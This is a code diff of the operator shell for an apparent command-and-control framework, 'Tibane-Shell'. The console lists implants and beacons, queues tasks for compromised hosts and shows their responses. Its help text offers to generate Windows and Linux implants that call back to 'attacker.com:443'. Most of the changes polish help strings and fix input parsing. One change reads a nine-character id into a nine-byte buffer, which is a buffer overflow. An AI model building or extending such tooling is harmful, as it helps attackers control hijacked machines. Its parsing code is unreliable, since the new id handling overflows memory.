@@ -27,22 +27,21 @@ extern "C" {
 char *IP;
 int PORT;
 
-const char tibane_shell_help[HELP_SIZE] = "\n[*] Tibane-Shell Usage\n"
-                                        "   implants : show all active implants\n "
+const char tibane_shell_help[HELP_SIZE] = "\n[*] Tibane-Shell Usage [*]\n\n"
+                                        "   implants : show all active implants\n"
                                         "   beacons : show all active beacons\n"
                                         "   get-implant -os=[windows/linux] -channel=[https/tls] -domain=attacker.com:443 -o=/path/to/implant : generate implant\n"
                                         "   list-tasks : shows all tasks for all implants\n"    
                                         "   beacon [id] : interactive shell for selected beacon\n"
-                                        "   quit, q, exit : exit the program\n\n";
+                                        "   use [id] : same as beacon\n"
+                                        "   quit, q, exit : exit the program\n"
+                                        "   \n---------------------------------\n\n";
 
-
-const char beacon_shell_help[HELP_SIZE] = "\n[*] Tibane-shell (Beacon Usage\n"
-                                    "   TASKS\n"                                    
+const char beacon_shell_help[HELP_SIZE] = "\n[*] Tibane-shell (Beacon Usage) [*]\n\n"                              
                                     "   new-task [task] : Issue new task for the beacon\n"
                                     "   list-tasks : Show all information abouts tasks for beacon\n"
-                                    "   reponse-task [task id] : show response for specific task"
-                                    ""
-                                    "\n\n";
+                                    "   response-task [task id] : show response for specific task\n"
+                                    "   \n-----------------------------------\n";
 
 
 void banner() {
@@ -222,7 +221,7 @@ class RetriveInfo : public Communicate_ {
             free(info_container);
             return NULL;
         }
-    
+
         free(info_json);
         cJSON_Delete(info);
     
@@ -255,7 +254,6 @@ class RetriveInfo : public Communicate_ {
 
         cJSON_Delete(info);
         free(info_);
-
 
         int bytes_received = recv(sock, info_container, MAX_SIZE, 0);
         if (bytes_received <= 0) {
@@ -327,7 +325,7 @@ class Operator {
 
 
 
-            if  (strncmp(cmd, "exit", 4) == 0||strncmp(cmd, "quit", 4)==0 || strncmp(cmd, "q", 1)==0) {
+            if  (strncmp(cmd, "exit", 4) == 0||strncmp(cmd, "quit", 4) == 0 || strncmp(cmd, "q", 1)==0) {
                 printf("\n[-] Back to Home Shell \n\n");
                 return;
             } else if (strncmp(cmd, "info", 4) == 0) {
@@ -353,9 +351,9 @@ class Operator {
                 }
                 sendinfo.new_task(id, task);
                 printf("\n[+] Added Task \n");
-            } else if (strncmp(cmd, "response-task", 14) == 0) {
+            } else if (strncmp(cmd, "response-task", strlen("response-task")) == 0) {
                 int task_id;
-                if (sscanf(cmd, "response-task %d", task_id) != 1) {
+                if (sscanf(cmd, "response-task %d", &task_id) != 1) {
                     printf("\n[-] MUST HAVE TASK ID\n");
                     continue;
                 }
@@ -363,8 +361,7 @@ class Operator {
                 // print this data
                 DisplayCommandResponse(data);
                 free(data);
-            }
-            else {
+            } else {
                 printf("%s", beacon_shell_help);
             }
 
@@ -489,11 +486,13 @@ void process_shell_command(const char* cmd, RetriveInfo recvinfo, SendInfo sendi
         printf("\n[-] Exiting \n\n");
         sleep(1);
         exit(0);
-    } 
-    else if (strncmp(cmd, "beacon", 6) == 0) {
-        char id[66];
-        if (sscanf(cmd, "beacon %65s", id) == 1) {
+    }
+    else if (strncmp(cmd, "beacon", 6) == 0 || strncmp(cmd, "use", 3) == 0) {
+        char id[9];
+        if (sscanf(cmd, "beacon %9s", id) == 1) {
             // confirm if id exists
+            op.AgentShell(id, recvinfo, sendinfo);
+        } else if (sscanf(cmd, "use %9s", id) == 1) {
             op.AgentShell(id, recvinfo, sendinfo);
         }
     } 
